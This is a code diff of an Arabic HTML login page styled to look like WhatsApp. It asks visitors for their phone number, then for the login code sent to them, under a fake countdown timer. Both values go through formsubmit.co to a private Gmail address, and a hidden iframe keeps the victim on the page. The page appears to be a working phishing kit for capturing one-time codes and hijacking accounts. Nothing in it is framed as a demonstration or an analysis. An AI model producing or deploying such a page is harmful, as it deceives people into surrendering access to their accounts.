@@ -2,20 +2,153 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>الخطوة 1 - رقم الهاتف</title>
+  <title>دخول باستخدام الهاتف</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background-color: #e5ddd5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      direction: rtl;
+    }
+    .form-box {
+      background-color: #ffffff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    h2 {
+      color: #075e54;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      font-weight: bold;
+      color: #333;
+      display: block;
+      margin: 10px 0 5px;
+    }
+    input[type="tel"],
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      border: 1.5px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input:disabled {
+      background-color: #f1f1f1;
+      color: #999;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #25d366;
+      color: white;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1ebc59;
+    }
+    #codeSection {
+      display: none;
+      margin-top: 20px;
+    }
+    #timer {
+      text-align: center;
+      font-weight: bold;
+      color: #d9534f;
+      margin-top: 10px;
+    }
+  </style>
 </head>
-<body style="direction: rtl; text-align: center; font-family: Arial; padding-top: 100px;">
+<body>
 
-  <h2>الخطوة 1: أدخل رقم هاتفك</h2>
+  <div class="form-box">
+    <h2>دخول باستخدام الهاتف</h2>
 
-  <form action="https://formsubmit.co/hellafi1992@gmail.com" method="POST">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="form2.html">
+    <!-- نموذج إرسال الكود -->
+    <form id="phoneForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" target="dummyFrame" onsubmit="return sendPhone();">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="نوع_الطلب" value="إرسال رقم الهاتف فقط">
 
-    <input type="tel" name="رقم_الهاتف" required pattern="[0-9]{10,15}" placeholder="مثال: 0551234567" style="padding:10px; width: 250px;">
-    <br><br>
-    <button type="submit" style="padding:10px 30px; font-size:16px;">أرسل الرقم ✅</button>
-  </form>
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" id="phone" name="رقم_الهاتف" required pattern="[0-9]{10,15}" placeholder="05xxxxxxxxx">
+
+      <button type="submit">أرسل الكود</button>
+    </form>
+
+    <!-- القسم الثاني -->
+    <div id="codeSection">
+      <form id="codeForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="نوع_الطلب" value="طلب الدخول">
+        <input type="hidden" name="رقم_الهاتف" id="phoneHidden">
+
+        <label for="code">الكود:</label>
+        <input type="text" id="code" name="كود_الدخول" placeholder="أدخل الكود هنا" required>
+
+        <div id="timer">الوقت المتبقي: 05:00</div>
+
+        <button type="submit">طلب الدخول ✅</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Frame وهمي لمنع إعادة تحميل الصفحة عند إرسال رقم الهاتف -->
+  <iframe name="dummyFrame" style="display:none;"></iframe>
+
+  <script>
+    function sendPhone() {
+      const phoneInput = document.getElementById('phone');
+      const phone = phoneInput.value.trim();
+
+      if (!phone.match(/^[0-9]{10,15}$/)) {
+        alert('يرجى إدخال رقم هاتف صحيح من 10 إلى 15 رقمًا');
+        return false;
+      }
+
+      // حفظ رقم الهاتف في النموذج الثاني
+      document.getElementById('phoneHidden').value = phone;
+
+      // تعطيل خانة الهاتف
+      phoneInput.disabled = true;
+
+      // إظهار حقل الكود + العداد
+      setTimeout(() => {
+        document.getElementById('codeSection').style.display = 'block';
+        startTimer(300);
+      }, 500);
+
+      return true;
+    }
+
+    function startTimer(seconds) {
+      const timerDisplay = document.getElementById('timer');
+      let time = seconds;
+      const countdown = setInterval(() => {
+        const min = Math.floor(time / 60).toString().padStart(2, '0');
+        const sec = (time % 60).toString().padStart(2, '0');
+        timerDisplay.textContent = `الوقت المتبقي: ${min}:${sec}`;
+        time--;
+        if (time < 0) {
+          clearInterval(countdown);
+          timerDisplay.textContent = 'انتهى الوقت ⛔️';
+        }
+      }, 1000);
+    }
+  </script>
 
 </body>
 </html>
